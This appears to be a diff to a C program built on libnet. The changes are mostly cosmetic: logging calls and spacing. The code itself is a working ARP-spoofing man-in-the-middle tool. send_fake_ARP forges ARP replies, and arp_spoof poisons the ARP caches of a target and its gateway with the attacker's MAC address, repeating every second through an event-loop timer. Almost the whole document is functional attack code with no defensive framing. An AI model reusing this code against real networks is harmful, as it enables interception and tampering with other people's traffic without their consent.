@@ -13,24 +13,24 @@ int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_c
 	/* start libnet */
 	net_t = libnet_init(LIBNET_LINK_ADV,dev,err_buf);
 	if(!net_t){
-		printf("libnet start fail\nmaybe it should run by root\n");
+		log_printf(MSG_ERROR, "libnet start fail\nmaybe it should run by root");
 		return -1;
 	}
 
 	/* build ARP */
-	p_tag= libnet_build_arp(ARPHRD_ETHER,EPT_IPv4,MAC_ADDR_LEN,IPv4_ADDR_LEN,op,
-			srcMac,srcIp,destMac,destIp,padPtr,18,net_t,0);
+	p_tag= libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IPv4_ADDR_LEN, op,
+			srcMac, srcIp, destMac, destIp, padPtr, 18, net_t, 0);
 	// the defined of hrd is in ../libnet/libnet-headers.h
 	if (p_tag == -1){
-		printf("libnet build_arp fail\n");
+		log_printf(MSG_ERROR, "libnet build_arp fail");
 		libnet_destroy(net_t);
 		return -1;
 	}
 
 	/* build ethernet */
-	p_tag = libnet_build_ethernet(destMac,srcMac,EPT_ARP, padPtr, 0 ,net_t ,0 );
+	p_tag = libnet_build_ethernet(destMac, srcMac, EPT_ARP, padPtr, 0 ,net_t ,0 );
 	if(p_tag == -1){
-		printf("libnet build_ethernet fail\n");
+		log_printf(MSG_ERROR, "libnet build_ethernet fail");
 		libnet_destroy(net_t);
 		return -1;
 	}
@@ -38,7 +38,7 @@ int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_c
 	/* send packet */
 	res = libnet_write(net_t);
 	if(res == -1){
-		printf("ARP libnet write fail\n");
+		log_printf(MSG_ERROR, "ARP libnet write fail");
 		libnet_destroy(net_t);
 		return -1;
 	}
@@ -47,34 +47,23 @@ int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_c
         libnet_destroy(net_t);
         return p_tag;	
 }
-void arp_spoof(void *eloop_data,void* user_data){
+void arp_spoof(void *eloop_data, void* user_data){
 	MITM_info* m_info=(MITM_info*)user_data;
-//	int p_tag_target;
-//	int p_tag_gateway;
-       /*p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
-                                m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
-       p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
-                                m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
-       if(p_tag_target == -1 || p_tag_gateway == -1){
-               log_printf(MSG_WARNING,"arp spoof fail");
-               return;
-       }
-       return;*/
 	if(!first){
-		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
-				m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
-		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
-				m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
+		p_tag_target=send_fake_ARP(m_info->dev, m_info->ATTACKER_MAC,
+				m_info->TARGET_MAC, m_info->GATEWAY_IP, m_info->TARGET_IP, 0);
+		p_tag_gateway=send_fake_ARP(m_info->dev, m_info->ATTACKER_MAC,
+				m_info->GATEWAY_MAC, m_info->TARGET_IP, m_info->GATEWAY_IP, 0);
 		if(p_tag_target == -1 || p_tag_gateway == -1){
 			first = 0;
 		} else {
 			first = 1;
 		}
 	} else {
-		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
-				m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
-		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->GATEWAY_MAC,
-				m_info->TARGET_IP,m_info->GATEWAY_IP,p_tag_gateway);
+		p_tag_target=send_fake_ARP(m_info->dev, m_info->ATTACKER_MAC, m_info->TARGET_MAC,
+				m_info->GATEWAY_IP, m_info->TARGET_IP, p_tag_target);
+		p_tag_gateway=send_fake_ARP(m_info->dev, m_info->ATTACKER_MAC, m_info->GATEWAY_MAC,
+				m_info->TARGET_IP, m_info->GATEWAY_IP, p_tag_gateway);
 	}
 	eloop_register_timeout(1, 0, arp_spoof, NULL, m_info);
 }
